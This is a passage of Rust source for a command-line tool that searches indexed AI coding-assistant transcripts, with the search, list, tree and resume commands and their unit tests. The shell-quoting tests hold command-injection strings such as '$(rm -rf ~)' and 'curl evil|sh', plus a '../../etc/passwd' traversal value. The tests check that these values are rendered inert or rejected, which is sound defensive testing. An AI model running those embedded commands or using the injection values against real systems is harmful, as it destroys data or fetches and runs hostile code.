/// reads as a rendering bug rather than a missing title. The indexers reject blanks on the
/// way in, but stored rows are not revisited unless the transcript changes, so the guard
/// is needed here too. Covers `search`, `search --group-by-session` and `list` at once.
fn display_summary(summary: Option<&str>) -> &str {
    match summary {
        Some(s) if !s.trim().is_empty() => {
            // First non-blank line only. These rows are one line each, with a suffix after
            // the summary (`(N matches)`, message counts), and an embedded newline pushes
            // that suffix onto its own line and makes the row ungreppable. Slash-command
            // transcripts carry multi-line summaries routinely.
            s.lines().find(|l| !l.trim().is_empty()).unwrap_or(s)
        }
        _ => "[no summary]",
    }
}

/// Truncate to `max` characters, reporting whether anything was dropped.
///
/// `chars()`, not bytes: the corpus is largely Japanese and a byte slice would panic on a
/// multibyte boundary. The bool is returned rather than left to the caller to infer from
/// the length, because an unconditional ellipsis claims a complete message was cut short.
fn truncate_chars(s: &str, max: usize) -> (String, bool) {
    let out: String = s.chars().take(max).collect();
    let dropped = s.chars().nth(max).is_some();
    (out, dropped)
}

fn cmd_search(
    query: &str,
    filter: &SearchFilter<'_>,
    show_content: bool,
    content_chars: usize,
    verbose: bool,
    group_by_session: bool,
    json_output: bool,
) -> Result<()> {
    maybe_background_index();
    let mut search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;

    if group_by_session {
        return cmd_search_grouped(
            &mut search,
            query,
            filter,
            show_content,
            content_chars,
            verbose,
            json_output,
        );
    }

    let search_result = search.search_conversations(query, filter)?;
    let results = search_result.rows;
    let stats = &search_result.stats;

    if json_output {
        print_json_envelope(
            &results,
            stats.truncated,
            show_content.then_some((&search, content_chars)),
        )?;
        // Also on stderr: a human piping stdout into jq never sees the envelope's
        // `truncated`, so the line still has a reader.
        print_truncation_notice(stats.truncated, results.len(), "results");
        if verbose {
            eprintln!(
                "Scanned {} sessions ({} messages), {} matched",
                stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
            );
            print_unindexed_warning(&search);
        }
        return Ok(());
    }

    if results.is_empty() {
        println!("No results found for: {}", query);
        // Before the diagnostics, because an empty list produced by `--limit 0` still has
        // matches behind it and "No results found" reads as their absence.
        print_truncation_notice(stats.truncated, results.len(), "results");
        eprintln!(
            "Scanned {} sessions ({} messages), 0 matched",
            stats.sessions_in_scope, stats.total_indexed_messages
        );
        print_unindexed_warning(&search);
        return Ok(());
    }

    if verbose {
        eprintln!(
            "Scanned {} sessions ({} messages), {} matched",
            stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
        );
        print_unindexed_warning(&search);
    }

    print_truncation_notice(stats.truncated, results.len(), "results");

    println!(
        "\u{1f50d} Found {} matches for '{}':\n",
        results.len(),
        query
    );

    for result in &results {
        let icon = if result.message_type == "user" {
            "\u{1f464}"
        } else {
            "\u{1f916}"
        };
        let timestamp = format_timestamp(&result.timestamp, true, false);
        let source_str = result.source.as_deref().unwrap_or("claude_code");
        let label = source_label(source_str);

        let project_dir = result.project_path.as_deref().unwrap_or("");
        let summary = display_summary(result.conversation_summary.as_deref());
        let session_id = &result.session_id;
        let message_uuid = &result.message_uuid;

        println!("{} {} {}", icon, label, summary);
        println!("   Session: {}", session_id);
        println!("   Project: {}", project_dir);
        println!("   Time: {}", timestamp);
        println!("   Message: {}", message_uuid);

        if show_content {
            if let Some(content) = search.get_full_message_content(message_uuid) {
                let (text, dropped) = truncate_chars(&content, content_chars);
                println!("\n   {}{}", text, if dropped { "…" } else { "" });
            }
        } else {
            println!("\n   {}", result.context_snippet);
        }

        if source_str == "opencode" {
            println!(
                "\n   OpenCode session: {}",
                session_id.strip_prefix("oc:").unwrap_or(session_id)
            );
        } else if source_str == "codex" {
            println!(
                "\n   Codex session: {}",
                session_id.strip_prefix("codex:").unwrap_or(session_id)
            );
        } else {
            println!("\n   Resume:");
            println!("     cd -- {}", shell_quote(project_dir));
            println!("     {} --resume {}", claude_cmd(), shell_quote(session_id));
        }
        println!();
    }

    Ok(())
}

fn cmd_search_grouped(
    search: &mut ConversationSearch,
    query: &str,
    filter: &SearchFilter<'_>,
    show_content: bool,
    content_chars: usize,
    verbose: bool,
    json_output: bool,
) -> Result<()> {
    let result = search.search_grouped_by_session(query, filter)?;
    let stats = &result.stats;

    if json_output {
        print_json_envelope(
            &result.rows,
            stats.truncated,
            show_content.then_some((&*search, content_chars)),
        )?;
        print_truncation_notice(stats.truncated, result.rows.len(), "sessions");
        if verbose {
            eprintln!(
                "Scanned {} sessions ({} messages), {} matched",
                stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
            );
            print_unindexed_warning(search);
        }
        return Ok(());
    }

    if result.rows.is_empty() {
        println!("No results found for: {}", query);
        print_truncation_notice(stats.truncated, result.rows.len(), "sessions");
        eprintln!(
            "Scanned {} sessions ({} messages), 0 matched",
            stats.sessions_in_scope, stats.total_indexed_messages
        );
        print_unindexed_warning(search);
        return Ok(());
    }

    if verbose {
        eprintln!(
            "Scanned {} sessions ({} messages), {} matched",
            stats.sessions_in_scope, stats.total_indexed_messages, stats.matched_messages
        );
        print_unindexed_warning(search);
    }

    print_truncation_notice(stats.truncated, result.rows.len(), "sessions");

    println!(
        "\u{1f50d} Found {} sessions matching '{}':\n",
        result.rows.len(),
        query
    );

    for grouped in &result.rows {
        let r = &grouped.representative;
        let source_str = r.source.as_deref().unwrap_or("claude_code");
        let label = source_label(source_str);
        let summary = display_summary(r.conversation_summary.as_deref());
        let project_dir = r.project_path.as_deref().unwrap_or("");
        let session_id = &r.session_id;
        let timestamp = format_timestamp(&r.timestamp, true, false);

        println!("{} {} ({} matches)", label, summary, grouped.match_count);
        println!("   Session: {}", session_id);
        println!("   Project: {}", project_dir);
        println!("   Time: {}", timestamp);

        if show_content {
            if let Some(content) = search.get_full_message_content(&r.message_uuid) {
                let (text, dropped) = truncate_chars(&content, content_chars);
                println!("\n   {}{}", text, if dropped { "…" } else { "" });
            }
        } else {
            println!("\n   {}", r.context_snippet);
        }

        if source_str != "opencode" && source_str != "codex" {
            println!("\n   Resume:");
            println!("     cd -- {}", shell_quote(project_dir));
            println!("     {} --resume {}", claude_cmd(), shell_quote(session_id));
        }
        println!();
    }

    Ok(())
}

fn cmd_context(uuid: &str, depth: i32, show_content: bool, json_output: bool) -> Result<()> {
    maybe_background_index();
    let search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;
    let result = search.get_conversation_context(uuid, depth)?;

    if json_output {
        let json_val = serde_json::to_value(&result)?;
        let localized = localize_timestamps(json_val);
        println!("{}", serde_json::to_string_pretty(&localized)?);
        return Ok(());
    }

    println!("Context for message: {}\n", uuid);

    if let Some(ref err) = result.error {
        println!("Error: {}", err);
        return Ok(());
    }

    // Show ancestors
    if !result.ancestors.is_empty() {
        println!("\u{1f4dc} Parent messages:");
        for msg in &result.ancestors {
            let icon = if msg.message_type == "user" {
                "\u{1f464}"
            } else {
                "\u{1f916}"
            };
            let summary = msg.summary.as_deref().unwrap_or("No summary");
            println!("  {} {}", icon, summary);
        }
        println!();
    }

    // Show target
    if let Some(ref msg) = result.message {
        println!("\u{1f3af} Target message:");
        let icon = if msg.message_type == "user" {
            "\u{1f464}"
        } else {
            "\u{1f916}"
        };
        if show_content {
            println!("  {} {}", icon, msg.full_content);
        } else {
            let summary = msg.summary.as_deref().unwrap_or("No summary");
            println!("  {} {}", icon, summary);
        }
        println!();
    }

    Ok(())
}

fn cmd_list(filter: &SearchFilter<'_>, json_output: bool) -> Result<()> {
    maybe_background_index();
    let search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;
    let result = search.list_recent_conversations(filter)?;
    let convs = &result.rows;

    if json_output {
        // `list` rows are conversations, not messages -- there is no body to attach.
        print_json_envelope(convs, result.truncated, None)?;
        print_truncation_notice(result.truncated, convs.len(), "conversations");
        return Ok(());
    }

    if convs.is_empty() {
        println!("No conversations found");
        // Before the reader concludes there is nothing here: `--limit 0` produces an empty
        // list that still has conversations behind it.
        print_truncation_notice(result.truncated, convs.len(), "conversations");
        return Ok(());
    }

    print_truncation_notice(result.truncated, convs.len(), "conversations");

    let display_days = filter.days_back.unwrap_or(7);
    println!("Recent conversations (last {} days):\n", display_days);

    for conv in convs {
        let last_at = conv.last_message_at.as_deref().unwrap_or("");
        let timestamp = format_timestamp(last_at, true, false);
        let source_str = conv.source.as_deref().unwrap_or("claude_code");
        let label = source_label(source_str);
        let summary = display_summary(conv.conversation_summary.as_deref());
        let msg_count = conv.message_count;
        let project = conv.project_path.as_deref().unwrap_or("");

        println!("{} [{}] {}", label, timestamp, summary);
        println!("  {} messages", msg_count);
        println!("  {}", project);
        println!("  Session: {}", conv.session_id);
        println!();
    }

    Ok(())
}

/// Exit status for a tree result.
///
/// `error` means no tree came back: an unresolvable or ambiguous session id, but also a
/// session that resolved and whose transcript could not be read (`raw_tree_error`). A
/// script reading `$?` has to be able to tell any of those from a conversation that is
/// genuinely empty.
///
/// `warning` deliberately stays 0: it means partial data *was* returned, and a non-zero
/// exit would tell callers to throw away output they should be reading.
fn tree_exit_code(tree: &crate::search::ConversationTree) -> i32 {
    if tree.error.is_some() {
        1
    } else {
        0
    }
}

/// Look up a session's tree, indexing its transcript on the spot if it is not in the index.
///
/// The retry is what makes "read the session that just ended" work without the user running
/// `index` by hand; `maybe_background_index` cannot cover it, being detached and debounced.
fn lookup_tree(
    db_path: &str,
    session_id: &str,
    project_roots: Option<&[std::path::PathBuf]>,
) -> Result<crate::search::ConversationTree> {
    let search = ConversationSearch::new(db_path)?;
    let tree = search.get_conversation_tree(session_id)?;

    // `conversation: None` alongside an error is exactly the two not-found shapes: an id
    // that would not resolve, and one that resolved to no conversation row. Reading the
    // struct rather than the error text keeps this independent of the message wording.
    // Both raw-transcript fallbacks keep `conversation: Some(..)`, so a session whose file
    // is merely unreadable never triggers a pointless re-index.
    if tree.conversation.is_some() || tree.error.is_none() {
        return Ok(tree);
    }

    // Released before the indexer opens the same database read-write.
    drop(search);
    if !index_single_session(db_path, session_id, project_roots) {
        return Ok(tree);
    }
    ConversationSearch::new(db_path)?.get_conversation_tree(session_id)
}

fn cmd_tree(session_id: &str, json_output: bool) -> Result<()> {
    let tree = lookup_tree(db::DEFAULT_DB_PATH, session_id, None)?;

    // Below the lookup, not above it: on top, the detached indexer it spawns would race
    // this command's own synchronous write for the same file against a 30s busy_timeout.
    // The lookup already handles the only case that needed fresher data.
    maybe_background_index();

    let code = tree_exit_code(&tree);

    if json_output {
        // The JSON body is unchanged, error key and all: the fzf preview and any existing
        // reader of `.error` keep working, and only the exit status becomes honest.
        let json_val = serde_json::to_value(&tree)?;
        let localized = localize_timestamps(json_val);
        println!("{}", serde_json::to_string_pretty(&localized)?);
    } else {
        println!("Conversation tree: {}\n", session_id);

        if let Some(ref err) = tree.error {
            // stderr, not stdout: `tree ... > out.txt` should leave the failure visible in
            // the terminal rather than buried in the file.
            eprintln!("Error: {}", err);
        } else {
            if let Some(ref warning) = tree.warning {
                eprintln!("Warning: {}", warning);
            }
            print_tree_nodes(&tree.tree, 0);
        }
    }

    if code != 0 {
        // process::exit skips destructors, so flush first or the JSON above is lost when
        // stdout is a pipe.
        use std::io::Write;
        let _ = std::io::stdout().flush();
        std::process::exit(code);
    }

    Ok(())
}

fn print_tree_nodes(nodes: &[TreeNode], indent: usize) {
    for node in nodes {
        let icon = if node.message_type == "user" {
            "\u{1f464}"
        } else {
            "\u{1f916}"
        };
        let summary = node.summary.as_deref().unwrap_or("");
        let truncated: String = summary.chars().take(80).collect();
        let prefix = "  ".repeat(indent);
        println!("{}{} {}", prefix, icon, truncated);
        print_tree_nodes(&node.children, indent + 1);
    }
}

fn cmd_resume(uuid: &str) -> Result<()> {
    // Direct query for the message
    let conn = db::connect(db::DEFAULT_DB_PATH, true)?;
    let result: std::result::Result<(String, String), _> = conn.query_row(
        "SELECT session_id, project_path FROM messages WHERE message_uuid = ?",
        [uuid],
        |row| Ok((row.get(0)?, row.get(1)?)),
    );

    match result {
        Ok((session_id, project_path)) => {
            println!("cd -- {}", shell_quote(&project_path));
            println!("{} --resume {}", claude_cmd(), shell_quote(&session_id));
        }
        Err(_) => {
            eprintln!("Message not found: {}", uuid);
            std::process::exit(1);
        }
    }

    Ok(())
}

fn cmd_hook() -> Result<()> {
    // Own TTL, not the shared one: search/tree/list all touch the same stamp, so at the
    // shared 300s an agent that searched during the session would leave this a no-op --
    // and that session's transcript is the one most likely to be asked about next.
    let ttl = hook_index_ttl_secs(std::env::var("CONVERSATION_SEARCH_HOOK_TTL").ok());
    let _ = try_background_index(Some(ttl));
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn unique_stamp_path(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("conv-search-{}-{}", name, std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        dir.join(".last-auto-index")
    }

    #[test]
    fn test_display_summary_treats_blank_as_missing() {
        assert_eq!(display_summary(None), "[no summary]");
        assert_eq!(display_summary(Some("")), "[no summary]");
        // Whitespace-only would otherwise print as a blank line, which reads as a
        // rendering bug rather than a missing title.
        assert_eq!(display_summary(Some("   ")), "[no summary]");
        assert_eq!(display_summary(Some("\n\t ")), "[no summary]");
    }

    #[test]
    fn test_display_summary_keeps_real_values() {
        assert_eq!(display_summary(Some("Auth Bug Fix")), "Auth Bug Fix");
        // Not trimmed for display -- only tested for emptiness.
        assert_eq!(display_summary(Some(" padded ")), " padded ");
    }

    #[test]
    fn test_display_summary_collapses_to_first_line() {
        // Row layout is one line with a suffix after the summary; a newline would push
        // that suffix onto its own line.
        assert_eq!(
            display_summary(Some("<command-message>daily-report</command-message>\n<command-name>/daily-report</command-name>")),
            "<command-message>daily-report</command-message>"
        );
    }

    #[test]
    fn test_display_summary_skips_leading_blank_lines() {
        assert_eq!(
            display_summary(Some("\n\n  \nReal Title\nmore")),
            "Real Title"
        );
    }

    /// A `ConversationSearch` over an in-memory DB holding one message.
    fn search_with_message(uuid: &str, body: &str) -> ConversationSearch {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        conn.execute_batch("PRAGMA foreign_keys = OFF;").unwrap();
        conn.execute_batch(include_str!("../data/schema.sql"))
            .unwrap();
        conn.execute(
            "INSERT INTO messages (message_uuid, session_id, depth, timestamp, message_type, project_path, full_content)
             VALUES (?, 'sess1', 0, '2025-01-15T10:00:00', 'user', '/proj', ?)",
            rusqlite::params![uuid, body],
        )
        .unwrap();
        ConversationSearch::from_connection(conn)
    }

    #[test]
    fn test_inject_full_content_attaches_body_and_truncation_flag() {
        let search = search_with_message("m1", "abcdefghij");
        let mut rows = serde_json::json!([{"message_uuid": "m1", "session_id": "sess1"}]);

        inject_full_content(&mut rows, &search, 5);

        assert_eq!(rows[0]["full_content"], "abcde");
        assert_eq!(rows[0]["full_content_truncated"], true);
    }

    #[test]
    fn test_inject_full_content_flags_untruncated_body() {
        let search = search_with_message("m1", "short");
        let mut rows = serde_json::json!([{"message_uuid": "m1"}]);

        inject_full_content(&mut rows, &search, 300);

        assert_eq!(rows[0]["full_content"], "short");
        assert_eq!(rows[0]["full_content_truncated"], false);
    }

    /// The grouped shape must work through the real serializer, not a hand-written JSON
    /// literal: the lookup depends on `GroupedRow` flattening its representative, and only
    /// serializing an actual `GroupedRow` proves that still holds.
    #[test]
    fn test_inject_full_content_handles_serialized_grouped_row() {
        let search = search_with_message("m1", "grouped body");
        let row = crate::search::GroupedRow {
            representative: crate::search::SearchResultRow {
                rowid: 1,
                message_uuid: "m1".to_string(),
                session_id: "sess1".to_string(),
                parent_uuid: None,
                timestamp: "2025-01-15T10:00:00".to_string(),
                message_type: "user".to_string(),
                project_path: Some("/proj".to_string()),
                depth: 0,
                is_sidechain: false,
                context_snippet: "snippet".to_string(),
                conversation_summary: None,
                conversation_file: None,
                source: Some("claude_code".to_string()),
            },
            match_count: 3,
        };
        let mut rows = serde_json::to_value(vec![row]).unwrap();

        inject_full_content(&mut rows, &search, 300);

        assert_eq!(rows[0]["match_count"], 3, "flattened shape assumption");
        assert_eq!(rows[0]["full_content"], "grouped body");
    }

    #[test]
    fn test_inject_full_content_leaves_rows_without_a_body_alone() {
        // No such message: the row must not gain a half-populated pair of keys.
        let search = search_with_message("m1", "body");
        let mut rows = serde_json::json!([{"message_uuid": "absent"}]);

        inject_full_content(&mut rows, &search, 300);

        assert!(rows[0].get("full_content").is_none());
        assert!(rows[0].get("full_content_truncated").is_none());
    }

    #[test]
    fn test_inject_full_content_ignores_non_array() {
        let search = search_with_message("m1", "body");
        let mut not_an_array = serde_json::json!({"message_uuid": "m1"});

        inject_full_content(&mut not_an_array, &search, 300);

        assert!(not_an_array.get("full_content").is_none());
    }

    #[test]
    fn test_row_message_uuid_reads_top_level() {
        let row = serde_json::json!({"message_uuid": "abc-123"});
        assert_eq!(row_message_uuid(&row).as_deref(), Some("abc-123"));
    }

    #[test]
    fn test_row_message_uuid_reads_flattened_grouped_row() {
        // GroupedRow flattens its representative, so the uuid sits next to match_count.
        let row = serde_json::json!({"message_uuid": "abc-123", "match_count": 5});
        assert_eq!(row_message_uuid(&row).as_deref(), Some("abc-123"));
    }

    #[test]
    fn test_row_message_uuid_absent_is_none() {
        let row = serde_json::json!({"session_id": "s1", "conversation_summary": "x"});
        assert_eq!(row_message_uuid(&row), None);
    }

    #[test]
    fn test_truncate_chars_shorter_than_max_is_untouched() {
        assert_eq!(truncate_chars("hello", 300), ("hello".to_string(), false));
    }

    #[test]
    fn test_truncate_chars_exact_length_is_not_marked_dropped() {
        // The off-by-one that printed a bare "..." after complete messages.
        assert_eq!(truncate_chars("abcde", 5), ("abcde".to_string(), false));
    }

    #[test]
    fn test_truncate_chars_longer_is_cut_and_flagged() {
        assert_eq!(truncate_chars("abcdef", 5), ("abcde".to_string(), true));
    }

    #[test]
    fn test_truncate_chars_multibyte_boundary() {
        // Byte slicing here would panic; chars() must count codepoints.
        let (out, dropped) = truncate_chars("日本語のテキスト", 3);
        assert_eq!(out, "日本語");
        assert!(dropped);
    }

    #[test]
    fn test_truncate_chars_zero_max() {
        assert_eq!(truncate_chars("abc", 0), (String::new(), true));
    }

    #[test]
    fn test_truncate_chars_zero_max_on_empty_input() {
        // Nothing was dropped, so nothing should claim otherwise.
        assert_eq!(truncate_chars("", 0), (String::new(), false));
    }

    fn tree_fixture(warning: Option<&str>, error: Option<&str>) -> crate::search::ConversationTree {
        crate::search::ConversationTree {
            conversation: None,
            tree: Vec::new(),
            total_messages: 0,
            warning: warning.map(String::from),
            error: error.map(String::from),
        }
    }

    #[test]
    fn test_tree_exit_code_error_is_failure() {
        assert_eq!(
            tree_exit_code(&tree_fixture(None, Some("Conversation x not found"))),
            1
        );
    }

    #[test]
    fn test_tree_exit_code_warning_still_succeeds() {
        // Partial data is still data; a non-zero exit would tell callers to discard it.
        assert_eq!(
            tree_exit_code(&tree_fixture(Some("Showing 3 of 10 message(s)."), None)),
            0
        );
    }

    #[test]
    fn test_tree_exit_code_clean_is_zero() {
        assert_eq!(tree_exit_code(&tree_fixture(None, None)), 0);
    }

    /// `confirm_prune` with an explicit answer on a simulated terminal.
    fn confirm_with_input(answer: &str) -> bool {
        let mut reader = std::io::Cursor::new(answer.as_bytes().to_vec());
        confirm_prune(5, false, true, &mut reader).unwrap()
    }

    #[test]
    fn test_confirm_prune_yes_flag_skips_stdin() {
        // Must not read the reader at all -- this is the path scripts and agents take.
        // An empty reader would return EOF, which parses as "no", so a passing assertion
        // here proves --yes short-circuits before any read.
        let mut empty = std::io::Cursor::new(Vec::new());
        assert!(confirm_prune(5, true, false, &mut empty).unwrap());
    }

    #[test]
    fn test_confirm_prune_refuses_without_tty() {
        let mut reader = std::io::Cursor::new(b"y\n".to_vec());
        let err = confirm_prune(5, false, false, &mut reader)
            .expect_err("non-TTY without --yes must be refused");
        assert!(
            err.to_string().contains("--yes"),
            "error should name the flag that unblocks it, got: {}",
            err
        );
        // The refusal must not depend on what was piped in: a script echoing "y" into the
        // command must still be refused, not silently obeyed.
        assert_eq!(reader.position(), 0, "stdin must not be consumed");
    }

    #[test]
    fn test_confirm_prune_accepts_yes_spellings() {
        for answer in ["y\n", "Y\n", "yes\n", "YES\n", " y \n"] {
            assert!(confirm_with_input(answer), "answer = {:?}", answer);
        }
    }

    #[test]
    fn test_confirm_prune_rejects_everything_else() {
        // "" is a bare Enter and "" via EOF is a closed stdin; neither is consent.
        // "yesterday" is the case a `starts_with("y")` implementation would get wrong.
        for answer in ["\n", "", "n\n", "no\n", "yesterday\n", "sure\n"] {
            assert!(!confirm_with_input(answer), "answer = {:?}", answer);
        }
    }

    #[test]
    fn test_shell_quote_leaves_ordinary_paths_alone() {
        assert_eq!(
            shell_quote("/Users/me/ghq/github.com/a/b-c_d.e"),
            "/Users/me/ghq/github.com/a/b-c_d.e"
        );
        assert_eq!(
            shell_quote("9ef036cc-e7e3-4066-b304-db797421ba42"),
            "9ef036cc-e7e3-4066-b304-db797421ba42"
        );
    }

    #[test]
    fn test_shell_quote_space() {
        assert_eq!(shell_quote("/My Projects/app"), "'/My Projects/app'");
    }

    #[test]
    fn test_shell_quote_command_substitution_is_inert() {
        assert_eq!(shell_quote("/tmp/$(rm -rf ~)"), "'/tmp/$(rm -rf ~)'");
        assert_eq!(shell_quote("/tmp/`id`"), "'/tmp/`id`'");
    }

    #[test]
    fn test_shell_quote_semicolon_and_pipe() {
        assert_eq!(shell_quote("/tmp/x;curl evil|sh"), "'/tmp/x;curl evil|sh'");
    }

    #[test]
    fn test_shell_quote_embedded_single_quote() {
        // Close, escape, reopen: `it's` must survive one round of shell parsing intact.
        assert_eq!(shell_quote("/tmp/it's"), r"'/tmp/it'\''s'");
    }

    #[test]
    fn test_shell_quote_empty_is_quoted_not_dropped() {
        // Unquoted, an empty string vanishes and `cd '' && ...` becomes `cd && ...`.
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn test_shell_quote_non_ascii_is_quoted() {
        // Japanese paths are ordinary here; they must land in the quoted branch rather
        // than being treated as safe by an ASCII-only allowlist that ignores them.
        assert_eq!(
            shell_quote("/Users/me/開発/アプリ"),
            "'/Users/me/開発/アプリ'"
        );
    }

    #[test]
    fn test_build_resume_command_quotes_hostile_project_path() {
        let cmd = build_resume_command("/tmp/x; touch pwned", "abc-123", "claude").unwrap();
        assert_eq!(
            cmd,
            "cd -- '/tmp/x; touch pwned' && claude --resume abc-123"
        );
    }

    #[test]
    fn test_build_resume_command_terminates_options_for_dash_leading_path() {
        // All-safe characters, so quoting alone would leave `cd -Users-x` reading its
        // argument as flags. The `--` is what actually closes this.
        let cmd = build_resume_command("-Users-x", "abc-123", "claude").unwrap();
        assert!(cmd.starts_with("cd -- -Users-x &&"), "got: {}", cmd);
    }

    #[test]
    fn test_build_resume_command_refused_for_control_characters() {
        // A newline would split the picker's tab-separated line and hand `eval` a fragment.
        assert!(build_resume_command("/tmp/a\nb", "abc-123", "claude").is_none());
        assert!(build_resume_command("/tmp/a\tb", "abc-123", "claude").is_none());
        // A NUL truncates the string for the consuming shell, leaving the quote unclosed.
        assert!(build_resume_command("/tmp/a\0b", "abc-123", "claude").is_none());
        assert!(build_resume_command("/tmp/ok", "abc\n123", "claude").is_none());
    }

    #[test]
    fn test_build_resume_command_refused_for_dash_leading_session_id() {
        // Whether `claude --resume` honours a `--` separator is that CLI's contract, so a
        // command that cannot be proven safe is not emitted at all.
        assert!(build_resume_command("/tmp/ok", "-x", "claude").is_none());
    }

    #[test]
    fn test_inject_resume_command_emits_null_when_unsafe() {
        let mut v = serde_json::json!([{
            "session_id": "abc-123",
            "project_path": "/tmp/a\nb",
            "source": "claude_code"
        }]);
        inject_resume_command(&mut v);
        assert!(v[0]["resume_command"].is_null());
    }

    #[test]
    fn test_inject_resume_command_quotes_hostile_project_path() {
        let mut v = serde_json::json!([{
            "session_id": "abc-123",
            "project_path": "/tmp/x; touch pwned",
            "source": "claude_code"
        }]);
        inject_resume_command(&mut v);
        let cmd = v[0]["resume_command"].as_str().unwrap();
        assert!(
            cmd.starts_with("cd -- '/tmp/x; touch pwned' && "),
            "got: {}",
            cmd
        );
    }

    #[test]
    fn test_is_stamp_stale_missing_file() {
        let path = unique_stamp_path("missing");
        let _ = std::fs::remove_file(&path);
        assert!(is_stamp_stale(&path, 300));
    }

    #[test]
    fn test_hook_ttl_defaults_to_zero() {
        // The Stop hook shares its stamp with search/tree/list. At the shared 300s TTL an
        // agent that ran any of them during the session would leave the hook a no-op --
        // which is precisely the session whose transcript most needs indexing.
        assert_eq!(hook_index_ttl_secs(None), 0);
        assert_eq!(hook_index_ttl_secs(Some("120".into())), 120);
        // Unparseable falls back to the default rather than to the shared 300s.
        assert_eq!(hook_index_ttl_secs(Some("soon".into())), 0);
    }

    #[test]
    fn test_zero_ttl_treats_a_fresh_stamp_as_stale() {
        let path = unique_stamp_path("zero-ttl");
        touch_stamp_at(&path);
        assert!(is_stamp_stale(&path, 0));
    }

    #[test]
    fn test_is_stamp_stale_fresh() {
        let path = unique_stamp_path("fresh");
        touch_stamp_at(&path);
        assert!(!is_stamp_stale(&path, 300));
    }

    #[test]
    fn test_is_stamp_stale_expired() {
        let path = unique_stamp_path("expired");
        touch_stamp_at(&path);
        // TTL=0 means always stale
        assert!(is_stamp_stale(&path, 0));
    }

    #[test]
    fn test_touch_stamp_at_creates_nested_dirs() {
        let dir = std::env::temp_dir().join(format!("conv-search-nested-{}", std::process::id()));
        let path = dir.join("subdir").join("stamp");
        let _ = std::fs::remove_dir_all(&dir);

        touch_stamp_at(&path);
        assert!(path.exists());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_touch_stamp_at_updates_mtime() {
        let path = unique_stamp_path("mtime");

        touch_stamp_at(&path);
        let mtime1 = std::fs::metadata(&path).unwrap().modified().unwrap();

        std::thread::sleep(std::time::Duration::from_millis(50));

        touch_stamp_at(&path);
        let mtime2 = std::fs::metadata(&path).unwrap().modified().unwrap();

        assert!(mtime2 > mtime1);
    }

    #[test]
    fn test_is_stamp_stale_boundary() {
        let path = unique_stamp_path("boundary");
        touch_stamp_at(&path);

        // Freshly written stamp with huge TTL is not stale
        assert!(!is_stamp_stale(&path, u64::MAX));
        // TTL=0 means always stale
        assert!(is_stamp_stale(&path, 0));
    }
}

#[cfg(test)]
mod index_single_session_tests {
    use super::{index_single_session, lookup_tree, transcript_lookup_key};
    use crate::indexer::ConversationIndexer;
    use crate::search::ConversationSearch;

    #[test]
    fn rejects_non_claude_code_sources() {
        // OpenCode and Codex sessions do not live in ~/.claude*/projects/<project>/<id>.jsonl.
        assert_eq!(
            transcript_lookup_key("oc:abcdef12-3456-7890-abcd-ef1234567890"),
            None
        );
        assert_eq!(
            transcript_lookup_key("codex:abcdef12-3456-7890-abcd-ef1234567890"),
            None
        );
    }

    #[test]
    fn rejects_ids_too_short_to_identify_a_session() {
        assert_eq!(transcript_lookup_key("abc"), None);
        assert_eq!(transcript_lookup_key("deadbee"), None);
    }

    #[test]
    fn rejects_ids_that_cannot_be_a_uuid() {
        // Guards the directory sweep. tests/test_pick.sh passes exactly this kind of value.
        assert_eq!(transcript_lookup_key("definitely-no-such-session-id"), None);
        assert_eq!(transcript_lookup_key("../../etc/passwd"), None);
    }

    #[test]
    fn accepts_a_uuid_and_a_prefix_of_one_lowercased() {
        assert_eq!(
            transcript_lookup_key("DEADBEEF-1111-2222-3333-444444444444"),
            Some("deadbeef-1111-2222-3333-444444444444".to_string())
        );
        assert_eq!(
            transcript_lookup_key("deadbeef"),
            Some("deadbeef".to_string())
        );
    }

    /// The one test that proves the retry actually works end to end.
    ///
    /// Every other assertion here checks that some input is *rejected*, which a lookup that
    /// silently finds nothing would also satisfy -- an earlier draft of this feature scanned
    /// one directory level too high and would have passed all of them.
    #[test]
    fn indexes_a_missing_session_and_returns_its_tree() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();

        let session = "deadbeef-1111-2222-3333-444444444444";
        std::fs::write(
            project.join(format!("{}.jsonl", session)),
            format!(
                "{}\n{}\n",
                format_args!(
                    r#"{{"uuid":"m1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"user","content":"how do I widen the search window"}}}}"#
                ),
                format_args!(
                    r#"{{"uuid":"m2","parentUuid":"m1","isSidechain":false,"timestamp":"2026-01-15T10:01:00Z","type":"assistant","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"assistant","content":[{{"type":"text","text":"pass --days to widen it"}}]}}}}"#
                ),
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();
        // The DB must already exist: a read path is never allowed to create one.
        ConversationIndexer::new(db_path, true).unwrap();

        let before = ConversationSearch::new(db_path)
            .unwrap()
            .get_conversation_tree(session)
            .unwrap();
        assert!(before.error.is_some(), "precondition: session is unindexed");

        let tree = lookup_tree(db_path, session, Some(&roots)).unwrap();
        assert!(tree.error.is_none(), "unexpected error: {:?}", tree.error);
        assert_eq!(tree.total_messages, 2);
        assert_eq!(tree.tree.len(), 1, "one root message");
        assert_eq!(tree.tree[0].children.len(), 1, "one reply under it");
    }

    /// A prefix has to work too: an agent copying a short id out of `search` output is the
    /// common case, and `resolve_session_id` accepts prefixes on the indexed path already.
    #[test]
    fn indexes_a_missing_session_given_only_a_prefix() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();

        let session = "abcdef01-2222-3333-4444-555555555555";
        std::fs::write(
            project.join(format!("{}.jsonl", session)),
